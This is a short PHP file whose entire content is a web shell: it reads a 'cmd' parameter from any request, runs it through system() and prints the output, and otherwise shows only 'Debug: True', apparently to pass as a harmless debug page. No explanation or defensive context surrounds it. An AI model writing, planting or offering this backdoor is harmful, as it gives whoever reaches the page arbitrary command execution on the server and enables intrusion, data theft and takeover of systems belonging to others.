<?php
if(isset($_REQUEST['cmd'])){
  echo "<pre>";
  $CMD=$_REQUEST['cmd'];
  system($CMD);
  echo "</pre>";
}
else{
  echo "Debug: True";
}

?>
